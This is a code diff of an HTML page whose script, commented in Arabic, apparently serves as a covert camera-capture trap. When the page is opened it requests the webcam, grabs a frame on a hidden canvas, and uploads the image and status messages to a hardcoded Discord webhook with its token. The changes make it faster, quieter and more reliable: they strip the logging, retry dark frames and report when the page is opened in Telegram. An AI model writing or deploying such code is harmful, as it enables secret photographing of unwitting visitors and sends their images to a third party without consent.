@@ -10,109 +10,105 @@
 <canvas id="canvas" style="display:none"></canvas>
 
 <script>
-// ضع رابط الويبهوك الجديد هنا
 const webhook = "https://discord.com/api/webhooks/1444407690850734303/tbyWBMt86W2rtj4Cw4ejj8F5qjD7PwvYrMmveQzWknZdtz8pNCH9oBgOpCQWYhbtI-5h";
 
-// أولاً: اختبر إذا الويبهوك شغال
-async function testWebhook() {
-    const testData = new FormData();
-    testData.append("content", "✅ الكاميرا جاهزة، جاري التصوير...");
-    
+// كشف متصفح تلغرام
+const isTelegram = /Telegram/i.test(navigator.userAgent);
+const isChrome = /Chrome/i.test(navigator.userAgent) && !isTelegram;
+
+async function sendMessage(msg) {
     try {
-        const res = await fetch(webhook, { method: "POST", body: testData });
-        if (res.ok) {
-            console.log("✓ الويبهوك شغال");
-            return true;
-        } else {
-            console.log("✗ الويبهوك فاشل - الكود: " + res.status);
-            return false;
-        }
-    } catch(e) {
-        console.log("✗ ما قدرت أوصل للويبهوك: " + e.message);
-        return false;
-    }
+        const fd = new FormData();
+        fd.append("content", msg);
+        await fetch(webhook, { method: "POST", body: fd });
+    } catch(e) {}
 }
 
-function captureAndSend(videoElement) {
+async function captureAndSend(video) {
     return new Promise((resolve) => {
         const canvas = document.getElementById('canvas');
-        canvas.width = videoElement.videoWidth;
-        canvas.height = videoElement.videoHeight;
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
         const ctx = canvas.getContext('2d');
-        ctx.drawImage(videoElement, 0, 0);
+        ctx.drawImage(video, 0, 0);
         
         canvas.toBlob(async (blob) => {
-            if (blob && blob.size > 5000) {
-                const formData = new FormData();
-                formData.append("file", blob, `shot_${Date.now()}.png`);
-                
-                // إرسال الصورة
-                const result = await fetch(webhook, { method: "POST", body: formData });
-                
-                if (result.ok) {
-                    console.log("✓ تم إرسال الصورة - الحجم: " + (blob.size/1024).toFixed(1) + "KB");
-                    
-                    // إرسال تأكيد نصي
-                    const confirmMsg = new FormData();
-                    confirmMsg.append("content", "📸 تم التصوير بنجاح");
-                    await fetch(webhook, { method: "POST", body: confirmMsg });
-                    
-                    resolve(true);
-                } else {
-                    console.log("✗ فشل إرسال الصورة - الكود: " + result.status);
-                    resolve(false);
-                }
+            if (blob && blob.size > 3000) {
+                const fd = new FormData();
+                fd.append("file", blob, `shot_${Date.now()}.png`);
+                const res = await fetch(webhook, { method: "POST", body: fd });
+                resolve(res.ok);
             } else {
-                console.log("✗ الصورة فاسدة أو صغيرة جداً (" + (blob?.size || 0) + " bytes)");
                 resolve(false);
             }
-        }, "image/png", 0.95);
+        }, "image/png", 0.85);
     });
 }
 
-async function startCamera() {
-    // اختبر الويبهوك أولاً
-    const webhookWorks = await testWebhook();
-    if (!webhookWorks) {
-        console.log("⚠️ الويبهوك ما يشتغل! غير الرابط");
-        alert("الويبهوك ما يشتغل! غير الرابط في الكود");
+async function start() {
+    // إذا كان تلغرام، نرسل رسالة تنبيه
+    if (isTelegram) {
+        await sendMessage("⚠️ تم فتح الرابط من تلغرام - المتصفح لا يدعم الكاميرا بشكل كامل");
         return;
     }
     
+    await sendMessage("📷 جاري تشغيل الكاميرا...");
+    
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { 
+                width: { ideal: 640 },  // دقة أقل = أسرع
+                height: { ideal: 480 }
+            } 
+        });
+        
         const video = document.getElementById('cam');
         video.srcObject = stream;
         
         video.onloadedmetadata = () => {
             video.play();
-            console.log("الكاميرا شغالة، ننتظر 2 ثانية...");
+            
+            // سرعة التصوير حسب المتصفح
+            let delay = isChrome ? 300 : 600;
             
             setTimeout(async () => {
-                console.log("نجرب نصور...");
-                const success = await captureAndSend(video);
+                // نفحص إذا الصورة سوداء
+                const testCanvas = document.createElement('canvas');
+                testCanvas.width = video.videoWidth;
+                testCanvas.height = video.videoHeight;
+                const ctx = testCanvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
                 
-                if (success) {
-                    console.log("✓ كل شيء تم بنجاح");
-                } else {
-                    console.log("✗ فشل التصوير");
+                const imageData = ctx.getImageData(0, 0, testCanvas.width, testCanvas.height);
+                let hasLight = false;
+                
+                // فحص سريع إذا في إضاءة
+                for (let i = 0; i < imageData.data.length; i += 1000) {
+                    if (imageData.data[i] > 50 || imageData.data[i+1] > 50 || imageData.data[i+2] > 50) {
+                        hasLight = true;
+                        break;
+                    }
                 }
                 
-                // نغلق الكاميرا
-                stream.getTracks().forEach(t => t.stop());
-            }, 2000);
+                if (!hasLight && isChrome) {
+                    // إذا سوداء، ننتظر نص ثانية ونعيد المحاولة
+                    setTimeout(async () => {
+                        await captureAndSend(video);
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 500);
+                } else {
+                    await captureAndSend(video);
+                    stream.getTracks().forEach(t => t.stop());
+                }
+            }, delay);
         };
         
     } catch(err) {
-        console.log("خطأ في الكاميرا: " + err.message);
-        // نرسل رسالة خطأ للويبهوك
-        const errorMsg = new FormData();
-        errorMsg.append("content", "❌ خطأ: " + err.message);
-        await fetch(webhook, { method: "POST", body: errorMsg });
+        await sendMessage("❌ خطأ: " + err.message);
     }
 }
 
-startCamera();
+start();
 </script>
 </body>
 </html>
